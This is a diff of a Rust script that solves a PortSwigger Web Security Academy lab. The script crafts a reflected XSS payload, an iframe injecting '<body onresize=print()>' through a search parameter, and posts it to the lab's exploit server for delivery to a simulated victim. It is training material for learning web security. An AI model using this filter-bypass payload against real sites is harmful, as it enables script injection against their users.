@@ -1,24 +1,16 @@
-/*******************************************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 21/11/2023
+/******************************************************************************
 *
 * Lab: Reflected XSS into HTML context with most tags and attributes blocked
 *
-* Steps: 1. Craft an iframe that, when loaded, will change the body width, causing the 
-*           onresize event handler to be invoked
-*        2. Deliver the exploit to the victim
-*        3. The print() function will be called after they trigger the exploit
+* Hack Steps: 
+*      1. Craft an iframe that, when loaded, will change the body width, 
+*         causing the onresize event handler to be invoked
+*      2. Deliver the exploit to the victim
+*      3. The print() function will be called after they trigger the exploit
 *
-********************************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+*******************************************************************************/
 use reqwest::{
-    blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
+    blocking::{Client, ClientBuilder},
     redirect::Policy,
 };
 use std::{
@@ -28,63 +20,48 @@ use std::{
 };
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0a3100e604948b9a827bceb400a900e3.web-security-academy.net";
+
+// Change this to your exploit server URL
+const EXPLOIT_SERVER_URL: &str =
+    "https://exploit-0a080003041d8bd2823ecdfb010d00c4.exploit-server.net";
+
 fn main() {
-    // change this to your lab URL
-    let lab_url = "https://0a02000b04e2d4618122b66f00020010.web-security-academy.net";
-
-    // change this to your exploit server URL
-    let exploit_server_url = "https://exploit-0aac004c040bd492819cb502019700fb.exploit-server.net";
-
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
-
-    // the header of your exploit sever response
-    let exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";
-
-    // payload to call the print() function
     let payload = format!(
-        r###"<iframe src="{lab_url}/?search=<body onresize=print()>" onload=this.style.width='100px'>"###
+        r###"<iframe src="{LAB_URL}/?search=<body onresize=print()>" onload=this.style.width='100px'>"###
     );
 
-    print!("{}", "❯❯ Delivering the exploit to the victim.. ".white(),);
-    io::stdout().flush();
+    print!("❯❯ Delivering the exploit to the victim.. ");
+    io::stdout().flush().unwrap();
 
-    // deliver the exploit to the victim
+    deliver_exploit_to_victim(&payload);
+
+    println!("{}", "OK".green());
+    println!("🗹 The print() function will be called after they trigger the exploit");
+    println!("🗹 The lab should be marked now as {}", "solved".green())
+}
+
+fn deliver_exploit_to_victim(payload: &str) {
+    let response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";
+    let client = build_web_client();
     client
-        .post(exploit_server_url)
+        .post(EXPLOIT_SERVER_URL)
         .form(&HashMap::from([
             ("formAction", "DELIVER_TO_VICTIM"),
             ("urlIsHttps", "on"),
             ("responseFile", "/exploit"),
-            ("responseHead", exploit_server_head),
-            ("responseBody", &payload),
+            ("responseHead", response_head),
+            ("responseBody", payload),
         ]))
         .send()
         .expect(&format!(
             "{}",
-            "[!] Failed to deliver the exploit to the victim".red()
+            "⦗!⦘ Failed to deliver the exploit to the victim".red()
         ));
-
-    println!("{}", "OK".green());
-    println!(
-        "{}",
-        "🗹 The print() function will be called after they trigger the exploit".white()
-    );
-    println!(
-        "{} {}",
-        "🗹 The lab should be marked now as".white(),
-        "solved".green()
-    )
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::default())
         .connect_timeout(Duration::from_secs(5))
